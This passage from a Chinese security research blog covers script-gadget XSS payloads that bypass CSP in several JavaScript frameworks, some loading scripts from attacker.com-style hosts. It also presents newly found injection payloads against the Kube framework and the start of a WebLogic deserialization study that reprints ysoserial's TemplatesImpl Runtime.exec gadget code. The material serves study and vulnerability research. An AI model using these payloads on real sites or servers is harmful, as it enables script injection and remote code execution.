title="产生原因"></a>产生原因</h3><ul><li>通过表达式解析器来进行non-eval</li><li>自定义的表达式解析器安全风险</li><li>表达式可被“动态编译”成Javascript</li><li>代码直接操作在DOM元素、属性或原生对象等</li><li>有足够多的复合表达式语言</li></ul><h3 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h3><ul><li><p><strong>Knockout</strong>属性绑定注入</p><pre><code class="html">&lt;div data-bind=&quot;value: alert(1)&quot;&gt;&lt;/div&gt;</code></pre><p>代码分析</p><pre><code class="js">// 获取data-bind属性switch (node.nodeType) &#123; case 1: return node.getAttribute(&quot;data-bind&quot;);// 写入到rewrittenBindingsvar rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options), functionBody = &quot;with($context)&#123;with($data||&#123;&#125;)&#123;return&#123;&quot; + rewrittenBindings + &quot;&#125;&#125;&#125;&quot;;return new Function(&quot;$context&quot;, &quot;$element&quot;, functionBody);// 执行上述脚本return bindingFunction(bindingContext, node);</code></pre></li><li><p><strong>Ajaxify</strong>将文本进行类型转换</p><pre><code class="html">&lt;div class=&quot;document-script&quot;&gt;alert(1)&lt;/div&gt;</code></pre><p>代码分析</p><pre><code class="js">// 获取document-script$scripts = $dataContent.find(&#39;.document-script&#39;);// 添加script$scripts.each(function()&#123;    var $script = $(this), scriptText = $script.text(), scriptNode = document.createElement(&#39;script&#39;);    if ( $script.attr(&#39;src&#39;) ) &#123;        if ( !$script[0].async ) &#123; scriptNode.async = false; &#125;        scriptNode.src = $script.attr(&#39;src&#39;);    &#125;        scriptNode.appendChild(document.createTextNode(scriptText));    contentNode.appendChild(scriptNode);&#125;);</code></pre></li><li><p><strong>Bootstrap-simplest</strong>直接插入html代码</p><pre><code class="html">&lt;div data-toggle=tooltip data-html=true title=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;aaaa&lt;/div&gt;&lt;script nonce=&quot;random&quot;&gt;  $(&quot;[data-toggle=tooltip]&quot;).tooltip();&lt;/script&gt;</code></pre><p>限制条件比较严格，tooltip的title可控且tooltip调用了<code>tooltip()</code></p><p>代码分析</p><pre><code class="js">// 初始化控件this.init(&#39;tooltip&#39;, element, options)// 显示控件if (!self.options.delay || !self.options.delay.show) return self.show()// 直接插入节点this.options.container ? $tip.appendTo(this.options.container) : $tip.insertAfter(this.$element)</code></pre></li><li><p><strong>Closure</strong>混淆闭包引入自定义js</p><pre><code class="html">&lt;a id=CLOSURE_BASE_PATH href=data:/,1/alert(1)//&gt;&lt;/a&gt;&lt;form id=CLOSURE_UNCOMPILED_DEFINES&gt;&lt;input id=goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING&gt;&lt;/form&gt;</code></pre></li><li><p><strong>Require JS</strong>允许自定义js文件</p><pre><code class="html">&lt;script data-main=&#39;data:1,alert(1)&#39; src=&#39;require.js&#39;&gt;&lt;/script&gt;</code></pre><p>代码分析</p><pre><code class="js">// 获取data-main属性dataMain = script.getAttribute(&#39;data-main&#39;);// 加载为配置文件cfg.deps = cfg.deps ? cfg.deps.concat(mainScript) : [mainScript];// 加载配置文件req.config = function (config) &#123;    return req(config);&#125;;</code></pre></li><li><p><strong>Ember</strong>允许动态插入script</p><pre><code class="html">&lt;script type=text/x-handlebars&gt; &lt;script src=//attacker.example.com// /&gt;&lt;/script&gt;</code></pre><p>代码分析</p><pre><code class="js">// 提取text/x-handlebars标签var selector = &#39;script[type=&quot;text/x-handlebars&quot;]&#39;;// 设置模板setTemplate(templateName, template);</code></pre></li><li><p><strong>JQuery</strong>重插入script</p><pre><code class="html">&lt;form class=&quot;child&quot;&gt;&lt;input name=&quot;ownerDocument&quot;/&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/form&gt;</code></pre><p>代码分析</p><pre><code class="js">// 插入下一个节点this.parentNode.insertBefore( elem, this.nextSibling );// 运行插入代码DOMEval( node.textContent.replace( rcleanScript, &quot;&quot; ), doc );</code></pre></li><li><p><strong>jQuery Mobile</strong>通过HTML注入闭合注释</p><pre><code class="html">&lt;div data-role=popup id=&#39;--&gt;&lt;script&gt;&quot;use strict&quot;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></pre><p>代码分析</p><pre><code class="js">// 代码拼接直接插入htmlif ( myId ) &#123;    ui.screen.attr( &quot;id&quot;, myId + &quot;-screen&quot; );    ui.container.attr( &quot;id&quot;, myId + &quot;-popup&quot; );    ui.placeholder        .attr( &quot;id&quot;, myId + &quot;-placeholder&quot; )        .html( &quot;&lt;!-- placeholder for &quot; + myId + &quot; --&gt;&quot; );&#125;</code></pre></li><li><p><strong>Aurelia</strong>利用本地函数创建script</p><pre><code class="html">&lt;div ref=&quot;me&quot;s.bind=&quot;$this.me.ownerDocument.createElement(&#39;script&#39;)&quot;data-bar=&quot;$&#123;$this.me.s.src=&#39;data:,alert(1)&#39;&#125;&quot;data-foobar=&quot;$&#123;$this.me.ownerDocument.body.appendChild($this.me.s)&#125;&quot;&gt;&lt;/div&gt;</code></pre></li><li><p><strong>Polymer 1.x</strong>重写“私人”下划线属性</p><pre><code class="html">&lt;template is=dom-bind&gt;&lt;divfive=&#123;&#123;insert(me._nodes.0.scriptprop)&#125;&#125;four=&quot;&#123;&#123;set('insert',me.root.ownerDocument.body.appendChild)&#125;&#125;&quot;three=&quot;&#123;&#123;set('me',nextSibling.previousSibling)&#125;&#125;&quot;two=&#123;&#123;set('_nodes.0.scriptprop.src','data:\,alert(1)')&#125;&#125;scriptprop=&#123;&#123;_factory()&#125;&#125;one=&#123;&#123;set('_factoryArgs.0','script')&#125;&#125; &gt;&lt;/template&gt;</code></pre></li><li><p><strong>Ractive</strong>引入任意js、窃取nonce</p><pre><code class="html">&lt;script id=&#39;template&#39; type=&#39;text/ractive&#39;&gt;    &lt;script src=&#39;//attacker.com/shout/&#39; /&gt;&lt;/script&gt;</code></pre><pre><code class="html">&lt;script id=&#39;template&#39; type=&#39;text/ractive&#39;&gt;      &lt;iframe srcdoc=&#39;&lt;script      nonce=&#123;&#123;@global.document.currentScript.nonce&#125;&#125;&gt;      alert(document.domain)      &lt;/&#123;&#123;&#125;&#125;script&gt;&#39;&gt;      &lt;/iframe&gt;&lt;/script&gt;</code></pre><p>代码分析</p><pre><code class="js">// 获取模板if (!(template = doc.getElementById(id))) &#123;    if (options &amp;&amp; options.noThrow) &#123;        return;    &#125;    throw new Error(`Could not find template element with id #$&#123;id&#125;`);    &#125;// 返回模板return &#39;textContent&#39; in template ? template.textContent : template.innerHTML;</code></pre></li></ul><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>Sink RegEx Mode</p><pre><code class="cmd">eval\(\.innerHTML\.html\(Function\(document\.createElement\(scriptElement\.src\.appendChild\(inputFunction\.apply\(\.insertAdjacentHTML\(</code></pre><p>我们这次的挖掘目标是<a href="https://github.com/imperavi/kube">Kube</a>，一个轻量的CSS框架</p><hr><p><strong>data-* Atrribute Gadget</strong></p><p>根据<code>Knockout Gadget</code>的思路查找是否存在函数构造</p><pre><code>RegEx: /new Function\(/i</code></pre><p>漏洞链如下</p><pre><code class="js">// 对data属性进行检查data: function(name, value)&#123;    if (name === undefined)    &#123;        var reDataAttr = /^data\-(.+)$/;        var attrs = this.get().attributes;        var data = &#123;&#125;;        var replacer = function (g) &#123; return g[1].toUpperCase(); &#125;;        for (var key in attrs)        &#123;            if (attrs[key] &amp;&amp; reDataAttr.test(attrs[key].nodeName))            &#123;                var dataName = attrs[key].nodeName.match(reDataAttr)[1];                var val = attrs[key].value; // Source                dataName = dataName.replace(/-([a-z])/g, replacer);                if (this._isObjectString(val)) val = this._toObject(val);                else val = (this._isNumber(val)) ? parseFloat(val) : this._getBooleanFromStr(val);                data[dataName] = val;            &#125;        &#125;        return data;    &#125;    return this.attr(name, value, true);&#125;// 判断是否为对象字符串_isObjectString: function(str)&#123;    return (str.search(/^&#123;/) !== -1);&#125;// 将字符串转为对象_toObject: function(str)&#123;    return (new Function(&quot;return &quot; + str))(); // Sink&#125;</code></pre><p>payload构造显然易见，直接找一个有<code>data-*</code>属性的空间，然后注入一个字典就好</p><pre><code class="html">&lt;meta http-equiv=content-security-policy content=&quot;script-src &#39;nonce-random&#39; &#39;unsafe-eval&#39; &#39;strict-dynamic&#39;; &quot;&gt;&lt;div data-name=&quot;&#123;tyao:alert(1)&#125;&quot; data-kube=&quot;alert&quot;&gt;xss&lt;/div&gt;&lt;script nonce=&quot;random&quot; src=&quot;kube/dist/js/kube.js&quot;&gt;&lt;/script&gt;&lt;script nonce=&quot;random&quot;&gt;    $K.init();&lt;/script&gt;</code></pre><p><strong>data-target Atrribute Gadget</strong></p><blockquote><p>这个比较鸡肋，绕不过<code>nonce</code>机制</p></blockquote><pre><code class="js">    _buildElement: function($el)    &#123;        return new App.Element(this.app, $el);    &#125;,    _buildTarget: function()    &#123;        return new App.Target(this.app, this.params.target); // Source    &#125;&#125;;</code></pre><pre><code class="js">    create: function(html)    &#123;        if (/^&lt;(\w+)\s*\/?&gt;(?:&lt;\/\1&gt;|)$/.test(html))        &#123;            return [document.createElement(RegExp.$1)];        &#125;        var elements = [];        var container = document.createElement(&#39;div&#39;);        var children = container.childNodes;        container.innerHTML = html; // Sink        for (var i = 0, l = children.length; i &lt; l; i++)        &#123;            elements.push(children[i]);        &#125;        return elements;    &#125;,</code></pre><p>在<code>data-target</code>属性注入</p><pre><code class="html">&lt;button data-target=&quot;&amp;lt;img src onerror=alert(1)&amp;gt;&quot; data-kube=&quot;alert&quot;&gt;xss&lt;/button&gt;&lt;script nonce=&quot;random&quot; src=&quot;kube/dist/js/kube.js&quot;&gt;&lt;/script&gt;&lt;script nonce=&quot;random&quot;&gt;    $K.init();&lt;/script&gt;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/55836826">深入理解output buffer</a></p><p><a href="https://xz.aliyun.com/t/4165">基于Gadgets绕过XSS防御机制</a></p><p><a href="https://blog.szfszf.top/article/32/">CSP 概念及绕过分析总结</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12609570.html#autoid-0-9-0">XSS之CSP绕过(转）</a></p><p><a href="https://www.freebuf.com/articles/web/133455.html">通过浏览器缓存来bypass nonce script CSP</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic反序列化漏洞研究</title>
      <link href="/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
      <url>/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搜集和分析关于WebLogic的反序列化漏洞</p></blockquote><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>序列化数据特征</strong></p><p>对weblogic在7001端口的T3协议进行抓包，可以发现java序列化之后数据的Magic头<code>ac ed 00 05</code>，其编码后是<code>rO0ABQ==</code></p><p><strong>使用场景</strong></p><ol><li>http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等</li><li>ServletsHTTP，Sockets，Session管理器包含的协议，包括JMX，RMI，JMS，JNDI等</li><li>xmlXstream，XMLDecoder等</li><li>json，包括Jackson，fastjson等</li></ol><p><strong>反序列化攻击时序图</strong></p><p>Java应用的反序列化流程</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105221529bd01a07b7dcb57cfbb91.png" alt="image-20210522152846833" style="zoom: 67%;" /><p><strong>反序列化流程图</strong></p><p>WebLogic进行反序列化的执行流程图</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127195915def76095470f1ec5fe.png" alt="img"></p><blockquote><p>实现了<code>External</code>接口的对象会调用<code>readExternal()</code>函数，实现了<code>Serialize</code>接口的对象会调用<code>readObject()</code>函数</p><p>使用<code>Proxy</code>类封装的对象会调用<code>readProxyClass()</code>函数，否则会调用<code>readClass()</code>函数</p><p>如果对象中存在<code>readResolve()</code>函数会自动执行它</p><p>weblogic的黑名单检查放置在<code>resolveProxyClass()</code>和<code>resolveClass()</code>函数中，函数为<code>ClassFilter.isBlackListed()</code></p></blockquote><p><strong>漏洞分类</strong></p><p>WebLogic反序列化高危漏洞主要分为java反序列化和xml反序列化，其中java发序列化可通过T3协议和IIOP协议触发，下面的漏洞分析也是根据这两大方面分隔展示</p><h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><p><strong>反射机制</strong></p><p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p><p><strong>RMI和JRMP协议</strong></p><p>RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样，RMI传输过程都使用序列化和反序列化。RMI目前使用Java远程消息交换协议JRMP（Java Remote Messaging Protocol）进行通信。JRMP协议是专为Java的远程对象制定的协议。</p><p><strong>CORBA</strong></p><p>CORBA（Common Object Request Broker Architecture，公共对象请求代理体系结构）是跨语言（C ++、Java等）的通信体系结构，通常在 IIOP 协议中使用。</p><p><strong>GIOP协议</strong></p><p>GIOP（General Inter-ORB Protocol，通用对象请求代理间通信协议）是分布式计算领域的一种抽象协议，负责ORB的通信。</p><p><strong>IIOP协议</strong></p><p>IIOP（Internet Inter-ORB Protocol，互联网内部对象请求代理协议），用来在CORBA对象请求代理之间交流的协议，实现Java和其他语言的CORBA的互操作。</p><p><strong>RMI-IIOP协议</strong></p><p>兼容了RMI和IIOP的实现，解决RMI和CORBA/IIOP无法同时使用的技术方案。</p><p><strong>T3协议</strong></p><p>WebLogic Server 中的 RMI 通信使用 T3 协议在WebLogic Server和其他 Java程序（包括客户端及其他 WebLogic Server 实例）间传输数据（序列化的类）。由于WebLogic的T3协议和Web协议共用同一个端口，因此只要能访问WebLogic就可利用T3协议实现payload和目标服务器的通信。</p><p><strong>IDL</strong></p><p>IDL（Interface Definition Language，接口定义语言）主要用于描述软件组件的应用程序编程接口的一种规范语言。它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。</p><p><strong>JAVA IDL</strong></p><p>JAVA IDL是一个分布的对象技术，允许其对象在不同的语言间进行交互。它的实现是基于CORBA，一个行业标准的分布式对象模型。每个语言支持CORBA都有他们自己的IDL Mapping映射关系，IDL和JAVA的映射关系可以参考<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html">文档</a>。</p><h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><p>在Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的任意一个方法，这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制</p><p><strong>获取class</strong></p><pre><code class="java">// 函数调用Class class1 = testClass.getClass();// class属性,最安全,性能最好,不会自动初始化该Class对象Class class2 = testClass.class;// 动态加载,最常用,className需要是类的全限定名,会自动初始化该Class对象Class class3 = Class.forName(&quot;&#123;package.className&#125;&quot;);// 动态加载Class class4 = ClassLoader.loadClass(&quot;&#123;package.className&#125;&quot;);</code></pre><blockquote><p>反射调用内部类的时候需要使用<code>$</code>来代替<code>.</code>，如<code>com.org.test</code>类有一个叫做<code>Hello</code>的内部类，则在调用它的时候要写成：<code>com.org.test$Hello</code></p></blockquote><p><strong>获取constructor</strong></p><pre><code class="java">// getDeclaredConstructor会返回所有有权限的构造器Constructor constructor1 = class1.getDeclaredConstructor(&#123;arg1&#125;.class, ...);Constructor constructors1 = class1.getDeclaredConstructors(&#123;arg1&#125;.class, ...);// getConstructor只返回权限是public的构造器Constructor constructor2 = class1.getConstructor(&#123;arg1&#125;.class, ...);Constructor constructors2 = class1.getConstructors(&#123;arg1&#125;.class, ...);</code></pre><p><strong>创建instance</strong></p><pre><code class="java">// 使用构造器进行实例化Object instance1 = constructor1.newInstance();// 当构造函数无参时,可直接使用class进行实例化Object instance1 = class1.newInstance();</code></pre><p><strong>获取method</strong></p><pre><code class="java">// getDeclaredMethod会返回到当前类的所有成员方法Method method1 = class1.getDeclaredMethod(&quot;&#123;methodName&#125;&quot;, &#123;arg1&#125;.class, ...);Method[] methods1 = class1.getDeclaredMethods();// getMethod只返回当前类和父类的权限是public的方法Method method2 = class1.getMethod(&quot;&#123;methodName&#125;&quot;, &#123;arg1&#125;.class, ...);Method[] methods2 = class1.getMethods();</code></pre><p><strong>调用method</strong></p><pre><code class="java">Process process1 = (Process) method1.invoke(instance1,&quot;&#123;arg0&#125;&quot;); // arg0是调用函数的参数,可选选项</code></pre><p><strong>获取method结果</strong></p><pre><code class="java">InputStream in = process1.getInputStream();</code></pre><p><strong>输出method结果</strong></p><pre><code class="java">System.out.println(IOUtils.toString(in,&quot;UTF-8&quot;));</code></pre><p><strong>设置public属性</strong></p><pre><code class="java">constructor1.setAccessible(true);method1.setAccessible(true);</code></pre><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>Java动态机制涉及一个接口和一个类，分别是<code>InvocationHandler</code>接口和<code>Proxy</code>类</p><p><strong>InvocationHandler</strong></p><p><code>InvocationHandler</code>接口是<code>proxy</code>代理实例的调用处理程序实现的一个接口，每一个proxy代理实例都有一个关联的调用处理程序，在代理实例调用方法时，方法调用被编码并调度到调用处理程序的<code>invoke</code>方法</p><p><strong>Proxy</strong></p><p><code>Proxy</code>类就是用来创建一个代理对象的类，它提供了很多方法，但是我们最常用的是<code>newProxyInstance</code>方法</p><pre><code class="java">public static Object newProxyInstance(    ClassLoader loader,  // 代理类的classloader    Class&lt;?&gt;[] interfaces,  // 代理类的interface数组    InvocationHandler h // 包含invoke函数实现的InvocationHandler)</code></pre><p><strong>样例</strong></p><pre><code class="java">import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;interface Hello &#123;    void morning(String name);&#125;public class Main &#123;    public static void main(String[] args) &#123;        InvocationHandler handler = new InvocationHandler() &#123;            @Override            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                System.out.println(method);                if (method.getName().equals(&quot;morning&quot;)) &#123;                    System.out.println(&quot;Good morning, &quot; + args[0]);                &#125;                return null;            &#125;        &#125;;        Hello hello = (Hello) Proxy.newProxyInstance(            Hello.class.getClassLoader(), // 传入ClassLoader            new Class[] &#123; Hello.class &#125;, // 传入要实现的接口            handler); // 传入处理调用方法的InvocationHandler        hello.morning(&quot;Bob&quot;);    &#125;&#125;</code></pre><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><blockquote><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p></blockquote><p>ysoerial是一款专门用于生成Java反序列化Payload的工具</p><p>我们可以在<code>src/main/java/ysoserial/payloads/</code>文件夹中自定义自己的Payload，不过在自定义之前我们需要了解<code>src/main/java/ysoserial/payloads/util</code>文件中工具类的使用</p><p><strong>ClassFiles.java</strong></p><pre><code class="java">// 将类转化为文件名String classAsFile(final Class&lt;?&gt; clazz, boolean suffix)// 将类转化为字节码byte[] classAsBytes(final Class&lt;?&gt; clazz)</code></pre><p><strong>Gadgets.java</strong></p><pre><code class="java">// 创建一个memberValues为map的AnnotationInvocationHandler接口InvocationHandler createMemoizedInvocationHandler ( final Map&lt;String, Object&gt; map )// 创建iface类对应的Proxy实例&lt;T&gt; T createProxy ( final InvocationHandler ih, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces )// 创建实现了AnnotationInvocationHandler接口的iface类对应的Proxy实例&lt;T&gt; T createMemoitizedProxy ( final Map&lt;String, Object&gt; map, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces )// 创建一个HashMap实例并加入&#123;key:val&#125;元素Map&lt;String, Object&gt; createMap ( final String key, final Object val )// 使用TemplatesImpl的Gadget构造执行command的对象Object createTemplatesImpl ( final String command )// 创建一个table成员为[&#123;v1:v1&#125;,&#123;v2:v2&#125;]的HashMap实例HashMap makeMap ( Object v1, Object v2 )</code></pre><p><strong>JavaVersion.java</strong></p><pre><code class="java">// 获取本地Java版本JavaVersion getLocalVersion()</code></pre><p><strong>PayloadRunner.java</strong></p><pre><code class="java">// 运行Payloadvoid run(final Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, final String[] args)</code></pre><p><strong>Reflections.java</strong></p><pre><code class="java">// 获取对象成员Field getField(final Class&lt;?&gt; clazz, final String fieldName)// 设置对象成员void setFieldValue(final Object obj, final String fieldName, final Object value)// 获取对象成员的值Object getFieldValue(final Object obj, final String fieldName)// 获取第一个构造器Constructor&lt;?&gt; getFirstCtor(final String name)// 使用构造器进行实例化&lt;T&gt; T createWithConstructor ( Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</code></pre><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><blockquote><p><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/</a></p></blockquote><p>在上面<code>Gadgets.java</code>中的<code>createTemplatesImpl()</code>函数中，我们提到了ysoserial是使用<code>TemplatesImpl</code>的Gadget来构造恶意数据的，下面我们详细介绍一下其原理</p><h3 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3><p>Java字节码操作库，提供了在运行时操作Java字节码的方法，如在已有Class中动态修改和插入Java static代码</p><p><strong>样例</strong></p><pre><code class="java">public class Cat &#123;&#125;@Testpublic void test() throws Exception &#123;  ClassPool pool = ClassPool.getDefault();  CtClass cc = pool.get(Cat.class.getName());  String cmd = &quot;System.out.println(\&quot;evil code\&quot;);&quot;;  // 创建static代码块，并插入代码  cc.makeClassInitializer().insertBefore(cmd);  String randomClassName = &quot;EvilCat&quot; + System.nanoTime();  cc.setName(randomClassName);  // 写入.class 文件  cc.writeFile();&#125;</code></pre><blockquote><p>这里有一个重要的知识点是<code>defineClass()</code>函数并不会触发上面的static代码，但是使用<code>newInstence()</code>函数进行实例化的时候可以触发</p></blockquote><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>首先我们找到<code>TemplatesImpl</code>类的入口点<code>getOutputProperties()</code>函数</p><pre><code class="java">public synchronized Properties getOutputProperties() &#123;    try &#123;        return newTransformer().getOutputProperties(); // 1 跟进newTransformer()函数    &#125;    catch (TransformerConfigurationException e) &#123;        return null;    &#125;&#125;</code></pre><pre><code class="java">public synchronized Transformer newTransformer()    throws TransformerConfigurationException&#123;    TransformerImpl transformer;    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,        _indentNumber, _tfactory); // 2 实例化了TransformerImpl,跟进getTransletInstance()函数    if (_uriResolver != null) &#123;        transformer.setURIResolver(_uriResolver);    &#125;    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;        transformer.setSecureProcessing(true);    &#125;    return transformer;&#125;</code></pre><pre><code class="java">private Translet getTransletInstance()    throws TransformerConfigurationException &#123;    try &#123;        if (_name == null) return null; // 3 令_name为非空往下进行        if (_class == null) defineTransletClasses(); // 4 令_class为空,跟进defineTransletClasses()函数        // The translet needs to keep a reference to all its auxiliary        // class to prevent the GC from collecting them        AbstractTranslet translet = (AbstractTranslet)                _class[_transletIndex].getConstructor().newInstance(); // 8 使用newInstance()触发static代码,至此代码利用完成        translet.postInitialization();        translet.setTemplates(this);        translet.setOverrideDefaultParser(_overrideDefaultParser);        translet.setAllowedProtocols(_accessExternalStylesheet);        if (_auxClasses != null) &#123;            translet.setAuxiliaryClasses(_auxClasses);        &#125;        return translet;    &#125;    catch (InstantiationException | IllegalAccessException |            NoSuchMethodException | InvocationTargetException e) &#123;        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);        throw new TransformerConfigurationException(err.toString(), e);    &#125;&#125;</code></pre><pre><code class="java">private void defineTransletClasses()    throws TransformerConfigurationException &#123;    if (_bytecodes == null) &#123;        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);        throw new TransformerConfigurationException(err.toString());    &#125;    TransletClassLoader loader = (TransletClassLoader)        AccessController.doPrivileged(new PrivilegedAction() &#123;            public Object run() &#123;                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); // 5 确保_tfactory成员具有getExternalExtensionsMap()函数,即需是一个TransformerFactoryImpl类            &#125;        &#125;);    try &#123;        final int classCount = _bytecodes.length;        _class = new Class[classCount];        if (classCount &gt; 1) &#123;            _auxClasses = new HashMap&lt;&gt;();        &#125;        for (int i = 0; i &lt; classCount; i++) &#123;            _class[i] = loader.defineClass(_bytecodes[i]); // 6 使用了loader.defineClass()加载类字节码,但是还缺少static代码的触发条件            final Class superClass = _class[i].getSuperclass();            // Check if this is the main class            if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; // 7 令superClass为ABSTRACT_TRANSLET,即父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet,使_transletIndex更新                _transletIndex = i;             &#125;            else &#123;                _auxClasses.put(_class[i].getName(), _class[i]);            &#125;        &#125;        if (_transletIndex &lt; 0) &#123;            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;    &#125;    catch (ClassFormatError e) &#123;        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);        throw new TransformerConfigurationException(err.toString());    &#125;    catch (LinkageError e) &#123;        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);        throw new TransformerConfigurationException(err.toString());    &#125;&#125;</code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>我们看一下最终的payload实现</p><pre><code class="java">public static class StubTransletPayload extends AbstractTranslet implements Serializable &#123;    private static final long serialVersionUID = -5971610431559700674L;    public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException &#123;&#125;    @Override    public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException &#123;&#125;&#125;// required to make TemplatesImpl happypublic static class Foo implements Serializable &#123;    private static final long serialVersionUID = 8207363842866235160L;&#125;public static Object createTemplatesImpl ( final String command ) throws Exception &#123;    if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) &#123;        // 引入了三个必要类        return createTemplatesImpl(            command,            Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;),            Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;),            Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;));    &#125;    return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);&#125;public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )        throws Exception &#123;    final T templates = tplClass.newInstance();    // 将cmd写入到StubTransletPayload类的静态代码中    ClassPool pool = ClassPool.getDefault();    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));    pool.insertClassPath(new ClassClassPath(abstTranslet));    final CtClass clazz = pool.get(StubTransletPayload.class.getName());    String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +        command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +        &quot;\&quot;);&quot;;    clazz.makeClassInitializer().insertAfter(cmd);    // 为重复利用采用随机命名    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());    // 传入父类类型,对应调用链第7个地方,但是_transletIndex默认为0,如果我们把payload直接放在第1位是不会有影响的    CtClass superC = pool.get(abstTranslet.getName());    clazz.setSuperclass(superC);    // 传入payload的字节码,至于这里为什么要引入一个Foo类我也不太清楚,去掉是不会有影响的    final byte[] classBytes = clazz.toBytecode();    Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;        classBytes, ClassFiles.classAsBytes(Foo.class)    &#125;);    // 对应调用链第3个地方    Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);    // 对应调用链第5个地方,但是其实_tfactory是被transient修饰的,是不参与反序列化的,它在readObject是会进行重构的,删除无影响    Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());    return templates;&#125;</code></pre><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebLogic环境搭建复杂，一般使用docker，可参考此<a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html">博客</a></p><h3 id="weblogic-10-3-6-0"><a href="#weblogic-10-3-6-0" class="headerlink" title="weblogic: 10.3.6.0"></a>weblogic: 